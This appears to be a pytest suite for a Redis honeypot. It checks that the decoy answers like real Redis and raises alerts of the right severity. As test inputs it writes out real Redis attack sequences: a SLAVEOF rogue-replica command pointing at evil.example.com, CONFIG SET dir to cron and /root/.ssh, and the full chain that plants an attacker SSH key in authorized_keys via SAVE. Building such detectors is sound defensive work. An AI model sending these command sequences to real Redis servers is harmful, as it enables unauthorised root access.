"""Redis honeypot tests.

Verifies RESP parsing for both inline and array command forms, and that
each modelled verb produces the right response shape + alert severity.
"""

import asyncio
import contextlib
import os
import socket

import pytest

os.environ["DATABASE_URL"] = "sqlite+aiosqlite:///:memory:"


def _free_port() -> int:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


@pytest.fixture(autouse=True)
async def setup_db():
    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import close_db, init_db

    event_buffer.reset_for_tests()
    await init_db()
    yield
    event_buffer.reset_for_tests()
    await close_db()


@pytest.fixture
async def redis_server():
    from honeypot_mcp.engines.redis import RedisEngine
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Honeypot, HoneypotType

    port = _free_port()
    async with get_session() as session:
        hp = Honeypot(name="redis-test", type=HoneypotType.REDIS, port=port)
        session.add(hp)
        await session.flush()

    engine = RedisEngine()
    cid = await engine.start("redis-test", port, {})
    try:
        yield port
    finally:
        await engine.stop(cid)


def _resp_array(*parts: bytes) -> bytes:
    """Build an RESP array request: `*N\\r\\n$len\\r\\nvalue\\r\\n…`."""
    out = f"*{len(parts)}\r\n".encode()
    for p in parts:
        out += f"${len(p)}\r\n".encode() + p + b"\r\n"
    return out


@pytest.mark.asyncio
async def test_redis_ping_pong_inline(redis_server):
    """Inline command form: `PING\\r\\n` → `+PONG\\r\\n`."""
    port = redis_server
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    try:
        writer.write(b"PING\r\n")
        await writer.drain()
        resp = await asyncio.wait_for(reader.readline(), timeout=2.0)
        assert resp == b"+PONG\r\n"
    finally:
        writer.close()
        with contextlib.suppress(Exception):
            await writer.wait_closed()


@pytest.mark.asyncio
async def test_redis_ping_pong_array(redis_server):
    """Array command form (what redis-cli sends)."""
    port = redis_server
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    try:
        writer.write(_resp_array(b"PING"))
        await writer.drain()
        resp = await asyncio.wait_for(reader.readline(), timeout=2.0)
        assert resp == b"+PONG\r\n"
    finally:
        writer.close()
        with contextlib.suppress(Exception):
            await writer.wait_closed()


@pytest.mark.asyncio
async def test_redis_auth_returns_wrongpass(redis_server):
    """AUTH must reply -WRONGPASS so brute force tools keep trying."""
    port = redis_server
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    try:
        writer.write(_resp_array(b"AUTH", b"hunter2"))
        await writer.drain()
        resp = await asyncio.wait_for(reader.readline(), timeout=2.0)
        assert resp.startswith(b"-WRONGPASS"), resp
    finally:
        writer.close()
        with contextlib.suppress(Exception):
            await writer.wait_closed()


@pytest.mark.asyncio
async def test_redis_info_returns_version_block(redis_server):
    """INFO must return a bulk string with a believable redis_version."""
    port = redis_server
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    try:
        writer.write(b"INFO\r\n")
        await writer.drain()
        # Read header line: `$<len>\r\n`
        header = await asyncio.wait_for(reader.readline(), timeout=2.0)
        assert header.startswith(b"$"), header
        body_len = int(header[1:].strip())
        body = await asyncio.wait_for(reader.readexactly(body_len), timeout=2.0)
        await reader.readexactly(2)  # trailing CRLF
        assert b"redis_version:" in body
        assert b"role:master" in body
    finally:
        writer.close()
        with contextlib.suppress(Exception):
            await writer.wait_closed()


@pytest.mark.asyncio
async def test_redis_slaveof_triggers_high_severity_alert(redis_server):
    """SLAVEOF/REPLICAOF is the rogue-replica exploit path — should be HIGH."""
    from sqlalchemy import select

    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert

    port = redis_server
    buf = event_buffer.get_buffer()
    await buf.start()
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        try:
            writer.write(_resp_array(b"SLAVEOF", b"evil.example.com", b"6379"))
            await writer.drain()
            resp = await asyncio.wait_for(reader.readline(), timeout=2.0)
            assert resp == b"+OK\r\n"
        finally:
            writer.close()
            with contextlib.suppress(Exception):
                await writer.wait_closed()
        await asyncio.sleep(1.2)
    finally:
        await buf.stop()

    async with get_session() as session:
        result = await session.execute(
            select(Alert).where(Alert.event_type == "redis_rogue_replica")
        )
        events = list(result.scalars().all())

    assert len(events) == 1
    assert events[0].severity.value == "high"
    assert events[0].payload["args"] == ["evil.example.com", "6379"]


@pytest.mark.asyncio
async def test_redis_config_set_dir_triggers_high(redis_server):
    """`CONFIG SET dir /var/spool/cron` is the Mirai dropper pattern — HIGH."""
    from sqlalchemy import select

    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert

    port = redis_server
    buf = event_buffer.get_buffer()
    await buf.start()
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        try:
            writer.write(_resp_array(b"CONFIG", b"SET", b"dir", b"/var/spool/cron"))
            await writer.drain()
            resp = await asyncio.wait_for(reader.readline(), timeout=2.0)
            assert resp == b"+OK\r\n"
        finally:
            writer.close()
            with contextlib.suppress(Exception):
                await writer.wait_closed()
        await asyncio.sleep(1.2)
    finally:
        await buf.stop()

    async with get_session() as session:
        result = await session.execute(select(Alert).where(Alert.event_type == "redis_config_set"))
        events = list(result.scalars().all())
    assert len(events) == 1
    assert events[0].severity.value == "high"
    assert events[0].payload["parameter"] == "dir"


@pytest.mark.asyncio
async def test_redis_eval_captures_script_body(redis_server):
    """EVAL must capture the Lua script body — that's the sandbox-escape
    research target. Severity HIGH."""
    from sqlalchemy import select

    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert

    port = redis_server
    buf = event_buffer.get_buffer()
    await buf.start()
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        try:
            script = b'redis.call("SET","x",1); return redis.status_reply("OK")'
            writer.write(_resp_array(b"EVAL", script, b"0"))
            await writer.drain()
            resp = await asyncio.wait_for(reader.readline(), timeout=2.0)
            assert resp.startswith(b"-ERR")
        finally:
            writer.close()
            with contextlib.suppress(Exception):
                await writer.wait_closed()
        await asyncio.sleep(1.2)
    finally:
        await buf.stop()

    async with get_session() as session:
        result = await session.execute(select(Alert).where(Alert.event_type == "redis_eval"))
        events = list(result.scalars().all())
    assert len(events) == 1
    assert b"redis.call" in events[0].payload["script_preview"].encode()
    assert events[0].severity.value == "high"


async def _cmd(reader, writer, *parts: bytes) -> bytes:
    writer.write(_resp_array(*parts))
    await writer.drain()
    return await asyncio.wait_for(reader.readline(), timeout=2.0)


@pytest.mark.asyncio
async def test_redis_keyspace_is_stateful(redis_server):
    """SET then GET must reflect the stored value — the statefulness that lets
    the exploit tool believe its write landed."""
    port = redis_server
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    try:
        assert await _cmd(reader, writer, b"SET", b"foo", b"bar") == b"+OK\r\n"
        # GET returns a bulk string: `$3\r\nbar\r\n`
        writer.write(_resp_array(b"GET", b"foo"))
        await writer.drain()
        header = await asyncio.wait_for(reader.readline(), timeout=2.0)
        assert header == b"$3\r\n"
        body = await asyncio.wait_for(reader.readexactly(5), timeout=2.0)
        assert body == b"bar\r\n"
        # EXISTS / DBSIZE reflect it; missing GET is a null bulk.
        assert await _cmd(reader, writer, b"EXISTS", b"foo") == b":1\r\n"
        assert await _cmd(reader, writer, b"DBSIZE") == b":1\r\n"
        assert await _cmd(reader, writer, b"GET", b"nope") == b"$-1\r\n"
    finally:
        writer.close()
        with contextlib.suppress(Exception):
            await writer.wait_closed()


@pytest.mark.asyncio
async def test_redis_config_get_reflects_config_set(redis_server):
    """CONFIG GET must echo what the attacker CONFIG SET — they verify the
    write path took before triggering SAVE."""
    port = redis_server
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    try:
        assert await _cmd(reader, writer, b"CONFIG", b"SET", b"dir", b"/root/.ssh") == b"+OK\r\n"
        # CONFIG GET dir → array [dir, /root/.ssh]
        writer.write(_resp_array(b"CONFIG", b"GET", b"dir"))
        await writer.drain()
        # *2\r\n $3\r\ndir\r\n $10\r\n/root/.ssh\r\n
        assert await asyncio.wait_for(reader.readline(), timeout=2.0) == b"*2\r\n"
        assert await asyncio.wait_for(reader.readline(), timeout=2.0) == b"$3\r\n"
        assert await asyncio.wait_for(reader.readline(), timeout=2.0) == b"dir\r\n"
        assert await asyncio.wait_for(reader.readline(), timeout=2.0) == b"$10\r\n"
        assert await asyncio.wait_for(reader.readline(), timeout=2.0) == b"/root/.ssh\r\n"
    finally:
        writer.close()
        with contextlib.suppress(Exception):
            await writer.wait_closed()


@pytest.mark.asyncio
async def test_redis_rce_dropper_chain_captured(redis_server):
    """The full unauth-RCE chain (CONFIG SET dir + dbfilename → SET ssh key →
    SAVE) must be captured as a CRITICAL redis_rce_dropper with the target path
    and the classified SSH-key payload."""
    from sqlalchemy import select

    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert

    port = redis_server
    buf = event_buffer.get_buffer()
    await buf.start()
    ssh_key = b"\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABattacker@evil\n\n"
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        try:
            await _cmd(reader, writer, b"CONFIG", b"SET", b"dir", b"/root/.ssh")
            await _cmd(reader, writer, b"CONFIG", b"SET", b"dbfilename", b"authorized_keys")
            await _cmd(reader, writer, b"SET", b"crackit", ssh_key)
            assert await _cmd(reader, writer, b"SAVE") == b"+OK\r\n"
        finally:
            writer.close()
            with contextlib.suppress(Exception):
                await writer.wait_closed()
        await asyncio.sleep(1.2)
    finally:
        await buf.stop()

    async with get_session() as session:
        result = await session.execute(
            select(Alert).where(Alert.event_type == "redis_rce_dropper")
        )
        events = list(result.scalars().all())

    assert len(events) == 1
    ev = events[0]
    assert ev.severity.value == "critical"
    assert ev.payload["target_path"] == "/root/.ssh/authorized_keys"
    kinds = {k["payload_kind"] for k in ev.payload["planted_keys"]}
    assert "ssh_authorized_key" in kinds


@pytest.mark.asyncio
async def test_redis_keyspace_bounded(redis_server):
    """The keyspace is capped so it can't be used to exhaust honeypot memory."""
    from honeypot_mcp.engines.redis import _MAX_KEYS

    port = redis_server
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    try:
        # Write more keys than the cap; each still returns +OK.
        for i in range(_MAX_KEYS + 20):
            assert await _cmd(reader, writer, b"SET", f"k{i}".encode(), b"v") == b"+OK\r\n"
        # DBSIZE must not exceed the cap.
        resp = await _cmd(reader, writer, b"DBSIZE")
        count = int(resp[1:].strip())
        assert count <= _MAX_KEYS
    finally:
        writer.close()
        with contextlib.suppress(Exception):
            await writer.wait_closed()
